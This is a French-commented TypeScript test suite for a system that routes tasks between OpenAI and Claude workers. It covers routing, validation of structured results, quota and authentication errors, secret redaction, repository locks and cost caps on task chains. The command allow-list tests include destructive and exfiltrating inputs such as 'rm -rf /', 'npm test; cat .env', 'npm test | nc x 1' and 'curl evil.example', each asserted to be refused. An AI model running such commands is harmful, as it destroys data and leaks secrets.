import { test, describe, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { createLogger } from '@atlas/core';
import { createRepositories, type Repositories } from '@atlas/data';
import { FixtureAiProvider, classifyAiError, extractJson } from '@atlas/llm';
import {
  OpenAiWorker,
  ClaudeWorker,
  HermesRouter,
  routeTask,
  fallbackFor,
  validateAiResult,
  taskFingerprint,
  checkCommand,
  redactSecrets,
  runAllowedCommand,
  WorkerRegistry,
  AtlasDaemon,
  DeterministicWorker,
  DEMO_HANDLERS,
  serverWorkerTypes,
  EXTERNAL_TOOLS_WORKER_TYPES,
} from '../src/index.ts';

/**
 * Ce qui doit rester vrai quand deux modèles travaillent sans surveillance.
 *
 * Les défauts qui comptent ici ne plantent pas : ils dépensent. Une chaîne qui
 * se renvoie la balle, une clé refusée retentée en boucle, une commande qui
 * s'exécute hors de la liste blanche — chacun coûte de l'argent ou ouvre une
 * porte, et aucun ne se signale de lui-même.
 *
 * Aucun test ne touche le réseau : les fournisseurs sont figés, ce qui est
 * aussi le mode par défaut du système tant que `ATLAS_AI_LIVE` est faux.
 */

const logger = createLogger({ level: 'error', pretty: false });
let repos: Repositories;
let dir: string;

const VALID_RESULT = {
  status: 'PASS',
  summary: 'rien à signaler',
  confidence: 0.9,
  findings: [],
  recommendations: [],
  next_tasks: [],
  artifacts: [],
};

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), 'atlas-ai-'));
  repos = createRepositories(join(dir, 'ai.db'), logger);
});

afterEach(() => {
  repos.close();
  rmSync(dir, { recursive: true, force: true });
});

const addTask = (over: Partial<Parameters<Repositories['tasks']['create']>[0]> = {}) =>
  repos.tasks.create({
    taskType: 'ARCHITECTURE_REVIEW',
    department: 'ENGINEERING',
    workerType: 'OPENAI',
    payload: { objective: 'relire le module' },
    ...over,
  }).task;

const context = () => ({
  logger,
  heartbeat: () => true,
  shuttingDown: () => false,
  correlationId: null,
});

describe('le routage est déterministe', () => {
  test('l’ingénierie va à Claude Code, la relecture à OpenAI', () => {
    // L'édition réelle revient à l'agent qui lit le dépôt et décide lui-même
    // quoi ouvrir ; l'analyse sans écriture reste sur l'API, moins chère et
    // sans worktree.
    assert.equal(routeTask('ENGINEERING_CHANGE').target, 'CLAUDE_CODE');
    assert.equal(routeTask('TEST_FAILURE').target, 'CLAUDE_CODE');
    assert.equal(routeTask('REPO_ANALYSIS').target, 'CLAUDE');
    assert.equal(routeTask('FINAL_REVIEW').target, 'OPENAI');
    assert.equal(routeTask('COMMERCIAL_REPLY_ANALYSIS').target, 'OPENAI');
    assert.equal(routeTask('APPROVE_EMAIL').target, 'HUMAN');
    // Un script en sous-processus, pas un modèle — mais un script que l'image
    // serveur dist-only n'a pas : le runner externe le sert, comme CLAUDE_CODE.
    assert.equal(routeTask('SALES_DISCOVERY').target, 'DETERMINISTIC_EXTERNAL');
  });

  test('un type inconnu ne part pas « au mieux » vers un modèle', () => {
    const route = routeTask('QUELQUE_CHOSE_DE_NOUVEAU');
    assert.equal(route.target, 'DETERMINISTIC');
    assert.match(route.reason, /pas de route déclarée/);
  });

  test('il n’y a pas de repli d’un modèle vers l’autre', () => {
    assert.equal(fallbackFor('CLAUDE').allowed, false);
    assert.match(fallbackFor('OPENAI').reason, /pas interchangeables/);
  });
});

describe('ce que le daemon du serveur prend, selon qui porte l’ingénierie', () => {
  test('intégré : tout, y compris CLAUDE_CODE et la découverte commerciale', () => {
    const types = serverWorkerTypes('embedded');
    assert.ok(types.includes('CLAUDE_CODE'));
    assert.ok(types.includes('DETERMINISTIC_EXTERNAL'));
  });

  test('externe : ni CLAUDE/CLAUDE_CODE ni la découverte commerciale — réservés à atlas-engineer', () => {
    const types = serverWorkerTypes('external');
    assert.ok(!types.includes('CLAUDE'));
    assert.ok(!types.includes('CLAUDE_CODE'));
    assert.ok(!types.includes('DETERMINISTIC_EXTERNAL'));
    assert.ok(types.includes('DETERMINISTIC'), 'les autres tâches déterministes restent au serveur');
  });

  test('EXTERNAL_TOOLS_WORKER_TYPES nomme exactement ce que serverWorkerTypes exclut en externe', () => {
    for (const type of EXTERNAL_TOOLS_WORKER_TYPES) {
      assert.ok(!serverWorkerTypes('external').includes(type));
      assert.ok(serverWorkerTypes('embedded').includes(type));
    }
  });
});

describe('DeterministicWorker sur un second nom de file', () => {
  test('ne répond que sur son propre workerType, jamais sur DETERMINISTIC', () => {
    const worker = new DeterministicWorker(
      { SALES_DISCOVERY: async () => ({ kind: 'DONE', result: {} }) },
      'DETERMINISTIC_EXTERNAL',
    );
    assert.equal(worker.type, 'DETERMINISTIC_EXTERNAL');
    assert.equal(worker.canHandle(addTask({ taskType: 'SALES_DISCOVERY', workerType: 'DETERMINISTIC_EXTERNAL' })), true);
    assert.equal(worker.canHandle(addTask({ taskType: 'SALES_DISCOVERY', workerType: 'DETERMINISTIC' })), false);
  });

  test('sans argument, se comporte exactement comme avant (workerType DETERMINISTIC)', () => {
    const worker = new DeterministicWorker({});
    assert.equal(worker.type, 'DETERMINISTIC');
  });
});

describe('le résultat structuré', () => {
  test('une sortie conforme est acceptée', () => {
    const check = validateAiResult(VALID_RESULT);
    assert.equal(check.valid, true);
    assert.equal(check.value?.status, 'PASS');
  });

  test('un champ décisif manquant fait échouer la validation', () => {
    for (const missing of ['status', 'summary', 'confidence']) {
      const partial = { ...VALID_RESULT } as Record<string, unknown>;
      delete partial[missing];
      const check = validateAiResult(partial);
      assert.equal(check.valid, false, `${missing} devrait être exigé`);
      assert.equal(check.value, null, 'aucune valeur ne doit être fabriquée');
    }
  });

  test('une confiance hors bornes est refusée, pas corrigée', () => {
    const check = validateAiResult({ ...VALID_RESULT, confidence: 1.4 });
    assert.equal(check.valid, false);
    assert.match(check.violations.join(' '), /hors bornes/);
  });

  test('du texte libre n’est jamais accepté comme résultat', () => {
    assert.equal(validateAiResult('tout va bien').valid, false);
    assert.equal(validateAiResult(null).valid, false);
  });

  test('le JSON est extrait même emballé dans du texte ou un bloc', () => {
    assert.deepEqual(extractJson('Voici :\n```json\n{"a":1}\n```\nvoilà'), { a: 1 });
    assert.equal(extractJson('aucun json ici'), null);
  });

  test('une sortie non conforme fait échouer la tâche, sans la valider', async () => {
    const provider = new FixtureAiProvider('OPENAI', 'gpt-5', [{ body: 'du texte libre' }]);
    const worker = new OpenAiWorker({ repos, provider, timeoutMs: 5_000 });
    const outcome = await worker.execute(addTask(), context());
    assert.equal(outcome.kind, 'FAILED');
    assert.equal(outcome.errorCode, 'SCHEMA_INVALID');
  });
});

describe('les erreurs fournisseur', () => {
  test('un 429 met en pause sans brûler de tentative', async () => {
    const provider = new FixtureAiProvider('OPENAI', 'gpt-5', [
      { error: { status: 429, message: 'Rate limit reached', headers: { 'retry-after': '30' } } },
    ]);
    const worker = new OpenAiWorker({ repos, provider, timeoutMs: 5_000 });
    const outcome = await worker.execute(addTask(), context());

    assert.equal(outcome.kind, 'PAUSED_QUOTA');
    assert.equal(outcome.retryAfterHeader, '30');
    assert.equal(outcome.provider, 'OPENAI');
  });

  test('un quota épuisé est distingué d’une limitation de débit', () => {
    assert.equal(
      classifyAiError({ status: 429, message: 'You exceeded your current quota' }).kind,
      'QUOTA_EXHAUSTED',
    );
    assert.equal(classifyAiError({ status: 429, message: 'Rate limit' }).kind, 'RATE_LIMITED');
  });

  test('une clé refusée ne boucle pas : elle appelle un humain', async () => {
    const provider = new FixtureAiProvider('ANTHROPIC', 'claude-haiku-4-5-20251001', [
      { error: { status: 401, message: 'invalid api key' } },
    ]);
    const worker = new OpenAiWorker({ repos, provider, timeoutMs: 5_000 });
    const outcome = await worker.execute(addTask(), context());

    assert.equal(outcome.kind, 'WAITING_HUMAN');
    assert.equal(outcome.errorCode, 'AUTH_ERROR');
    // Surtout pas PAUSED_QUOTA : aucune attente ne fait revenir une clé.
    assert.notEqual(outcome.kind, 'PAUSED_QUOTA');
  });

  test('un 401 dont le message parle de « limit » reste une erreur d’authentification', () => {
    // Le piège : un message générique contenant le mot « limit » ferait
    // attendre indéfiniment une clé qui ne reviendra pas seule.
    const verdict = classifyAiError({ status: 401, message: 'unauthorized: rate limit policy' });
    assert.equal(verdict.kind, 'AUTH_ERROR');
    assert.equal(verdict.retryable, false);
  });

  test('l’usage est consigné même quand l’appel échoue', async () => {
    const provider = new FixtureAiProvider('OPENAI', 'gpt-5', [
      { error: { status: 500, message: 'boom' } },
    ]);
    const task = addTask();
    await new OpenAiWorker({ repos, provider, timeoutMs: 5_000 }).execute(task, context());
    assert.equal(repos.tasks.aiUsageSince('2000-01-01').calls, 1);
  });
});

describe('les secrets ne sortent pas', () => {
  test('une clé dans un message d’erreur est masquée', () => {
    const leaked = 'Error: bad key sk-proj-ABCDEFGHIJKLMNOPQRSTUVWXYZ012345';
    const clean = redactSecrets(leaked);
    assert.ok(!clean.includes('ABCDEFGHIJKLMNOPQRSTUVWXYZ'), clean);
    assert.match(clean, /secret masqué/);
  });

  test('un jeton porteur et un mot de passe sont masqués aussi', () => {
    assert.match(redactSecrets('Bearer abcdefghijklmnopqrstuvwxyz123'), /secret masqué/);
    assert.match(redactSecrets('api_key=abcdefghijklmnop'), /secret masqué/);
  });

  test('le statut d’un fournisseur ne contient jamais la clé', () => {
    const provider = new FixtureAiProvider('OPENAI', 'gpt-5', [{ body: VALID_RESULT }]);
    assert.ok(!JSON.stringify(provider.status()).includes('sk-'));
  });
});

describe('la liste blanche de commandes', () => {
  test('les commandes du dépôt sont autorisées', () => {
    for (const command of ['npm test', 'npm run typecheck', 'npm run build', 'git status']) {
      assert.equal(checkCommand(command).allowed, true, command);
    }
  });

  test('une commande hors liste est refusée', () => {
    assert.equal(checkCommand('rm -rf /').allowed, false);
    assert.equal(checkCommand('curl https://exemple.fr').allowed, false);
  });

  test('un enchaînement derrière une commande autorisée est refusé', () => {
    // La forme que prend un contournement : la garde regarde la commande
    // entière, pas son préfixe.
    for (const command of ['npm test && rm -rf /', 'npm test; cat .env', 'npm test | nc x 1']) {
      const verdict = checkCommand(command);
      assert.equal(verdict.allowed, false, command);
      assert.match(verdict.reason, /enchaînement interdit/);
    }
  });

  test('une commande interdite n’est jamais lancée', async () => {
    const outcome = await runAllowedCommand('rm -rf /', dir, 1_000);
    assert.equal(outcome.code, 126);
    assert.equal(outcome.pid, null, 'aucun processus ne doit démarrer');
  });

  test('une commande demandée hors liste fait échouer avant tout appel de modèle', async () => {
    const provider = new FixtureAiProvider('ANTHROPIC', 'claude-haiku-4-5-20251001', [
      { body: VALID_RESULT },
    ]);
    const worker = new ClaudeWorker({
      repos, provider, timeoutMs: 5_000, workspaceRoot: dir,
    });
    const task = addTask({
      taskType: 'ENGINEERING_CHANGE',
      workerType: 'CLAUDE',
      payload: { objective: 'corriger', test_commands: ['curl evil.example'] },
    });
    const outcome = await worker.execute(task, context());

    assert.equal(outcome.kind, 'FAILED');
    assert.equal(outcome.errorCode, 'COMMAND_NOT_ALLOWED');
    // Le point du test : aucun appel n'a été payé pour découvrir cela.
    assert.equal(provider.calls.length, 0);
  });
});

describe('le verrou d’écriture sur le dépôt', () => {
  test('deux tâches mutantes ne travaillent pas en même temps', async () => {
    const provider = new FixtureAiProvider('ANTHROPIC', 'claude-haiku-4-5-20251001', [
      { body: VALID_RESULT, delayMs: 5 },
    ]);
    const worker = new ClaudeWorker({ repos, provider, timeoutMs: 5_000, workspaceRoot: dir });

    const first = addTask({
      taskType: 'ENGINEERING_CHANGE', workerType: 'CLAUDE',
      payload: { objective: 'A', allowed_paths: ['a.ts'] },
    });
    const second = addTask({
      taskType: 'ENGINEERING_CHANGE', workerType: 'CLAUDE',
      payload: { objective: 'B', allowed_paths: ['b.ts'] },
    });

    // Le premier prend le verrou ; on le simule en le posant à la main pour que
    // le second le rencontre de façon déterministe.
    repos.tasks.acquireRepoLock({
      lockKey: 'REPO_WRITE', taskId: first.taskId, owner: first.taskId,
      mode: 'WRITE', leaseMs: 60_000,
    });

    const outcome = await worker.execute(second, context());
    assert.equal(outcome.kind, 'PAUSED_QUOTA');
    assert.equal(outcome.errorCode, 'REPO_LOCKED');
  });

  test('une tâche en lecture seule ne prend pas le verrou', async () => {
    const provider = new FixtureAiProvider('ANTHROPIC', 'claude-haiku-4-5-20251001', [
      { body: VALID_RESULT },
    ]);
    repos.tasks.acquireRepoLock({
      lockKey: 'REPO_WRITE', owner: 'quelqu-un', mode: 'WRITE', leaseMs: 60_000,
    });
    const worker = new ClaudeWorker({ repos, provider, timeoutMs: 5_000, workspaceRoot: dir });
    const outcome = await worker.execute(
      addTask({ taskType: 'REPO_ANALYSIS', workerType: 'CLAUDE', payload: { objective: 'lire' } }),
      context(),
    );
    assert.equal(outcome.kind, 'DONE');
  });

  test('un verrou dont le bail a expiré est repris', () => {
    repos.tasks.acquireRepoLock({
      lockKey: 'REPO_WRITE', owner: 'agent-mort', mode: 'WRITE', leaseMs: -1_000,
    });
    const taken = repos.tasks.acquireRepoLock({
      lockKey: 'REPO_WRITE', owner: 'agent-vivant', mode: 'WRITE', leaseMs: 60_000,
    });
    assert.equal(taken.acquired, true);
    assert.equal(repos.tasks.repoLockHolder('REPO_WRITE')?.owner, 'agent-vivant');
  });

  test('le verrou est rendu même quand la tâche échoue', async () => {
    const provider = new FixtureAiProvider('ANTHROPIC', 'claude-haiku-4-5-20251001', [
      { body: 'sortie invalide' },
    ]);
    const worker = new ClaudeWorker({ repos, provider, timeoutMs: 5_000, workspaceRoot: dir });
    const outcome = await worker.execute(
      addTask({
        taskType: 'ENGINEERING_CHANGE', workerType: 'CLAUDE',
        payload: { objective: 'A', allowed_paths: ['a.ts'] },
      }),
      context(),
    );
    assert.equal(outcome.kind, 'FAILED');
    // Un verrou laissé posé après un échec bloquerait le dépôt jusqu'à
    // l'expiration du bail, soit bien plus longtemps que nécessaire.
    assert.equal(repos.tasks.repoLockHolder('REPO_WRITE'), null);
  });
});

describe('les bornes de chaîne', () => {
  const limits = { maxDepth: 2, maxTasks: 4, maxCostUsd: 1, maxRuntimeMinutes: 60 };
  const hermes = () => new HermesRouter({ repos, logger, limits });

  test('la profondeur maximale bloque la descendance', () => {
    const root = addTask({ chainDepth: 2 });
    const verdict = hermes().canCreateChild(root, {
      taskType: 'CODE_FIX', objective: 'corriger quelque chose de nouveau',
    });
    assert.equal(verdict.allowed, false);
    assert.equal(verdict.blockedBy, 'MAX_DEPTH');
  });

  test('la même demande deux fois dans la chaîne est bloquée', () => {
    const root = addTask();
    const child = { taskType: 'CODE_FIX', objective: 'corriger le résolveur de contacts' };
    assert.equal(hermes().canCreateChild(root, child).allowed, true);

    hermes().createChildren(root, {
      ...VALID_RESULT,
      status: 'CHANGES_REQUIRED',
      next_tasks: [{ task_type: child.taskType, objective: child.objective }],
    } as never);

    const second = hermes().canCreateChild(root, child);
    assert.equal(second.allowed, false);
    assert.equal(second.blockedBy, 'DUPLICATE_CHILD_BLOCKED');
  });

  test('deux formulations de la même demande ont la même empreinte', () => {
    const a = taskFingerprint({ taskType: 'CODE_FIX', objective: 'corriger le test du résolveur' });
    const b = taskFingerprint({ taskType: 'CODE_FIX', objective: 'Le résolveur : corriger son test !' });
    assert.equal(a, b, 'le renvoi de balle passe par une reformulation');
  });

  test('la même demande sur deux cibles reste deux travaux', () => {
    const a = taskFingerprint({ taskType: 'CODE_FIX', objective: 'corriger le test', target: 'a.ts' });
    const b = taskFingerprint({ taskType: 'CODE_FIX', objective: 'corriger le test', target: 'b.ts' });
    assert.notEqual(a, b);
  });

  test('le plafond de coût arrête la chaîne', () => {
    const root = addTask();
    repos.tasks.recordAiCall({
      taskId: root.taskId, chainId: root.chainId, provider: 'OPENAI', model: 'gpt-5',
      inputTokens: 1000, outputTokens: 500, costUsd: 1.5, costBasis: 'KNOWN', outcome: 'OK',
    });
    const verdict = hermes().canCreateChild(root, {
      taskType: 'CODE_FIX', objective: 'quelque chose de tout à fait nouveau',
    });
    assert.equal(verdict.allowed, false);
    assert.equal(verdict.blockedBy, 'MAX_COST');
  });

  test('un worker ne crée jamais de tâche lui-même', async () => {
    const provider = new FixtureAiProvider('OPENAI', 'gpt-5', [
      {
        body: {
          ...VALID_RESULT,
          status: 'CHANGES_REQUIRED',
          next_tasks: [{ task_type: 'CODE_FIX', objective: 'corriger ceci' }],
        },
      },
    ]);
    const task = addTask();
    const before = repos.tasks.countByStatus().QUEUED ?? 0;
    await new OpenAiWorker({ repos, provider, timeoutMs: 5_000 }).execute(task, context());
    // La proposition est dans le résultat ; la tâche n'existe pas encore.
    assert.equal(repos.tasks.countByStatus().QUEUED ?? 0, before);
  });
});

describe('la chaîne complète, sans réseau', () => {
  test('OpenAI → Claude → OpenAI, puis terminée', async () => {
    const openai = new FixtureAiProvider('OPENAI', 'gpt-5', [
      {
        body: {
          ...VALID_RESULT,
          status: 'CHANGES_REQUIRED',
          summary: 'le module gagnerait un cas de test',
          // REPO_ANALYSIS, et non ENGINEERING_CHANGE : ce test porte sur la
          // chaîne des workers d'API. L'édition de code part vers Claude Code,
          // qui a son propre worker et sa propre couverture — l'exiger ici
          // ferait attendre un worker que ce registre n'enregistre pas.
          next_tasks: [{ task_type: 'REPO_ANALYSIS', objective: 'relever le cas de test manquant' }],
        },
      },
      { body: { ...VALID_RESULT, status: 'PASS', summary: 'correction conforme' } },
    ]);
    const claude = new FixtureAiProvider('ANTHROPIC', 'claude-haiku-4-5-20251001', [
      { body: { ...VALID_RESULT, status: 'DONE', summary: 'cas de test ajouté',
                next_tasks: [{ task_type: 'FINAL_REVIEW', objective: 'valider la correction apportée' }] } },
    ]);

    const registry = new WorkerRegistry()
      .register(new OpenAiWorker({ repos, provider: openai, timeoutMs: 5_000 }))
      .register(new ClaudeWorker({ repos, provider: claude, timeoutMs: 5_000, workspaceRoot: dir }))
      .register(new DeterministicWorker(DEMO_HANDLERS));

    const hermes = new HermesRouter({
      repos, logger,
      limits: { maxDepth: 4, maxTasks: 12, maxCostUsd: 1, maxRuntimeMinutes: 60 },
    });

    const root = addTask({ taskType: 'ARCHITECTURE_REVIEW', workerType: 'OPENAI' });

    // Le daemon exécute ; Hermes décide des suites entre deux passages.
    for (let round = 0; round < 3; round++) {
      await new AtlasDaemon({
        repos, registry, logger, leaseMs: 5_000, heartbeatMs: 500,
        maxIdleMs: 20, maxCycles: 2,
      }).run();

      for (const task of repos.tasks.chainTasks(root.chainId ?? root.taskId)) {
        if (task.status !== 'DONE' || !task.result) continue;
        const done = task.result as Record<string, unknown>;
        if ((done.next_tasks as unknown[])?.length) {
          hermes.createChildren(task, done as never);
          // Consommé une fois : sans cela, la même proposition relancerait un
          // enfant à chaque tour — et l'empreinte serait la seule barrière.
          (task.result as Record<string, unknown>).next_tasks = [];
        }
      }
    }

    const summary = hermes.chainSummary(root.chainId ?? root.taskId);
    assert.ok(summary.tasks >= 2, `chaîne de ${summary.tasks} tâche(s)`);
    assert.equal(summary.waitingHuman, 0);

    const types = repos.tasks.chainTasks(root.chainId ?? root.taskId).map((t) => t.taskType);
    assert.ok(types.includes('REPO_ANALYSIS'), `types : ${types.join(', ')}`);
  });
});

describe('le mode figé ne dépense rien', () => {
  test('un appel figé est marqué comme simulé, pas comme gratuit', async () => {
    const provider = new FixtureAiProvider('OPENAI', 'gpt-5', [{ body: VALID_RESULT }]);
    const task = addTask();
    await new OpenAiWorker({ repos, provider, timeoutMs: 5_000 }).execute(task, context());

    const usage = repos.tasks.aiUsageSince('2000-01-01');
    assert.equal(usage.calls, 1);
    // Le coût connu reste à zéro parce que rien n'a été facturé — et le motif
    // est `SIMULATED`, pas `KNOWN`, pour que le rapport ne s'y trompe pas.
    assert.equal(usage.knownCostUsd, 0);
    assert.equal(repos.tasks.chainCost(task.chainId!).calls, 1);
  });

  test('un tarif inconnu est compté à part, jamais comme zéro', () => {
    const task = addTask();
    repos.tasks.recordAiCall({
      taskId: task.taskId, chainId: task.chainId, provider: 'OPENAI', model: 'modele-inconnu',
      inputTokens: 1000, outputTokens: 100, costUsd: null, costBasis: 'UNKNOWN_PRICE', outcome: 'OK',
    });
    const usage = repos.tasks.aiUsageSince('2000-01-01');
    assert.equal(usage.unknownCostCalls, 1);
    assert.equal(usage.knownCostUsd, 0);
  });
});
